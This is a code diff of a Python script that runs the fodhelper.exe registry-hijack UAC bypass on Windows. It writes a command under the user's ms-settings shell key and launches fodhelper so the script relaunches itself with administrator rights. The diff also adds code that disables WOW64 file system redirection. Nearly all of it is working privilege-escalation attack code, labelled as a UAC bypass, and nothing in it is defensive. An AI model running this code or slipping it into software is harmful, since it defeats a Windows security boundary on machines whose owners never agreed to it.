@@ -3,11 +3,23 @@ import sys
 import ctypes
 import winreg
 
-TARGET_FILE = r'C:\Windows\System32\cmd.exe'
+CMD = r"C:\Windows\System32\cmd.exe"
 FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
-PYTHON_COMMAND = 'python'
+PYTHON_CMD = "python"
 REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
 DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
+old_value = ''
+
+
+def disable_file_system_redirection():
+    global old_value
+    old_value = ctypes.c_long()
+    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(old_value))
+
+
+def enable_file_system_redirection():
+    global old_value
+    ctypes.windll.kernel32.Wow64RevertWow64FsRedirection(old_value)
 
 
 def is_running_as_admin():
@@ -17,8 +29,8 @@ def is_running_as_admin():
     """
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
-    except Exception:
-        raise
+    except:
+        return False
 
 
 def create_reg_key(key, value):
@@ -34,13 +46,13 @@ def create_reg_key(key, value):
         raise
 
 
-def bypass_uac(command):
+def bypass_uac(cmd):
     """
     Tries to bypass the UAC
     """
     try:
         create_reg_key(DELEGATE_EXEC_REG_KEY, '')
-        create_reg_key(None, command)
+        create_reg_key(None, cmd)
     except WindowsError:
         raise
 
@@ -50,9 +62,10 @@ def execute():
         print('[!] The script is NOT running with administrative privileges')
         print('[+] Trying to bypass the UAC')
         try:
+            disable_file_system_redirection()
             current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
-            command = '{} /k {} {}'.format(TARGET_FILE, PYTHON_COMMAND, current_dir)
-            bypass_uac(command)
+            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
+            bypass_uac(cmd)
             os.system(FOD_HELPER)
             sys.exit(0)
         except WindowsError:
